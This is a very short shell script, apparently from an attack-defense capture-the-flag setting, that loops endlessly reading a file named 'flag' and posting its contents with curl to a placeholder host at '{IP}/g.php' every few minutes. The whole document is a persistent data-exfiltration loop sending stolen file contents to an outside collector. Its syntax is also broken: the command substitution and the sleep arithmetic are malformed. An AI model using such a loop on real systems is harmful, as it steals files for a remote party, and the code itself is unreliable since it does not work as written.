#!/usr/bin/sh
while true
do
    curl -d "flag=${`cat flag`}" "http://{IP}/g.php"
    sleep 1*60*10
done